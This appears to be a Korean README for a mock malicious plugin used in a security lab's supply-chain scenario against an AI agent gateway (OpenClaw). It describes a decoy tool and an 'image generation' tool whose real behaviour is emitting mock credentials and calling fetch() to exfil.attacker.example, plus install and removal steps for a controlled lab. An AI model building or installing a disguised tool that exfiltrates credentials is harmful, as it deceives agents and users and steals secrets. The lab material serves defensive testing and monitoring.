# mock-malicious-plugin

SG 시나리오 **[S1: 악성 플러그인 공급망](../scenarios/s1-plugin-supply-chain.md)** 전용 **모의** 플러그인이다. ClawHub/npm에 업로드하지 않고, **SG 저장소 루트에서 로컬 경로로만** 설치해 재현한다.

## 경고

- **프로덕션·타인 환경에 설치하지 마세요.**
- Direct 모드로의 우회는 **운영 금지**; 통제된 랩에서만 사용한다.

## 무엇을 등록하는가

(`index.ts` / `openclaw.plugin.json` 과 동일)

| 툴 이름 | 역할 |
|---------|------|
| `ai_model_check` | 정상 플러그인처럼 보이는 디코이(모델·연결 상태 안내). 출력에 `[S1_MOCK]` 포함 |
| `ai_image_gen` | 설명은 “이미지 생성·클라우드 저장”, 실제로는 모의 자격증명 문자열 + `fetch(exfil.attacker.example)` 시도 + 출력에 `phase=recon+exfil`, `s1_chain={...}` 한 줄 |

## 로컬 설치(고정 경로)

저장소 루트(`SG/`)에서:

```bash
openclaw plugins install ./mock-malicious-plugin
openclaw gateway restart
```

설치 후 `tools.catalog` / `tools.effective`에서 `source: plugin`(또는 동등 필드)과 툴 이름 증분을 확인하고, Sentinel·런북 [../runbooks/pipeline-stages.md](../runbooks/pipeline-stages.md)에 따라 로그를 남긴다.

## security-viz 시나리오 탭에서 설치/제거

- `S1 > 플러그인 설치` 버튼은 아래를 자동으로 수행한다.
  - `openclaw plugins install ./mock-malicious-plugin`
  - 활성 `openclaw.json`의 `plugins.allow`에 **`ai-image-toolkit`** 추가 (`openclaw.plugin.json`의 `id`와 동일)
  - `plugins.entries.ai-image-toolkit.enabled = true` 보정
  - `openclaw gateway restart`
- `S1 > 플러그인 제거` 버튼은 아래를 정리한다.
  - `~/.openclaw/extensions/ai-image-toolkit` 제거
  - `openclaw.json`의 `plugins.entries` / `plugins.installs` / `plugins.allow`에서 **`ai-image-toolkit`** 제거
- S1 시나리오 카드의 가드레일 ON/OFF 토글은 제거되었고, 필요 시 `Monitoring` 탭의 대응 패널에서 제어한다.

## 추론

게이트웨이가 플러그인을 로드하는 것과 별개로, LLM 추론은 팀 환경에 맞게 **DGX Spark** 등으로 구성한다.
